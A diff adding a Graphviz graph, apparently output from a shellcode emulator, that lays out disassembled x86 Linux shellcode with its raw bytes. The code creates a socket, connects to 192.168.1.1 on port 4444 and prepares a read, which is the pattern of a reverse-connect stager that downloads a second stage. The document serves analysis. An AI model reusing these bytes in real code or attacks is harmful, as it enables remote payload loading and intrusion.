@@ -1,0 +1,13 @@
+digraph G {
+	//rankdir=LR
+	node [fontname=Courier, labeljust=r];
+	 "0x952dfc0" [shape=box, label = "0x00417000 31DB                            xor ebx,ebx\l0x00417002 53                              push ebx\l0x00417003 43                              inc ebx\l0x00417004 53                              push ebx\l0x00417005 6A02                            push byte 0x2\l0x00417007 6A66                            push byte 0x66\l0x00417009 58                              pop eax\l0x0041700a 89E1                            mov ecx,esp\l"]
+	 "0x95304f8" [shape=box, style=filled, color=".7 .3 1.0", label = "0x0041700c socket\l"]
+	 "0x95305d0" [shape=box, label = "0x0041700e 97                              xchg eax,edi\l0x0041700f 5B                              pop ebx\l0x00417010 68C0A80101                      push dword 0x101a8c0\l0x00417015 6668115C                        push word 0x5c11\l0x00417019 6653                            push bx\l0x0041701b 89E1                            mov ecx,esp\l0x0041701d 6A66                            push byte 0x66\l0x0041701f 58                              pop eax\l0x00417020 50                              push eax\l0x00417021 51                              push ecx\l0x00417022 57                              push edi\l0x00417023 89E1                            mov ecx,esp\l0x00417025 43                              inc ebx\l"]
+	 "0x95312e0" [shape=box, style=filled, color=".7 .3 1.0", label = "0x00417026 connect\l"]
+	 "0x95313c0" [shape=box, label = "0x00417028 5B                              pop ebx\l0x00417029 99                              cwd \l0x0041702a B60C                            mov dh,0xc\l0x0041702c B003                            mov al,0x3\l"]
+	 "0x952dfc0" -> "0x95304f8" [style = bold ]
+	 "0x95304f8" -> "0x95305d0" [style = bold ]
+	 "0x95305d0" -> "0x95312e0" [style = bold ]
+	 "0x95312e0" -> "0x95313c0" [style = bold ]
+}
